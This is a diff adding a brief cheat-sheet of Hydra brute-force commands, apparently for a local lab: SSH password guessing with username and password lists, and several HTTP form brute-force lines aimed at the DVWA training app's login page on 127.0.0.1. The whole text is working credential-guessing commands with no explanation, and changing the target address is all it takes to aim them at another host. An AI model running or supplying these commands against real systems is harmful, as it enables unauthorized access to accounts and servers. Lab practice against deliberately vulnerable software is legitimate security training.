@@ -1,0 +1,11 @@
+SSH
+hydra -L names.txt -P passwd.txt -t 8 127.0.0.1  ssh
+
+HTTP
+
+hydra -l admin -P passwd.txt 127.0.0.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed"
+
+hydra -L names.txt -P passwd.txt 127.0.0.1 http-get -t 8 "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" -V
+
+hydra -l admin -p password 127.0.0.1 http-post-form -t 8 "/dvwa/login.php:username=^USER^&password=^PASS^&Login=submit:Login failed" -V
+
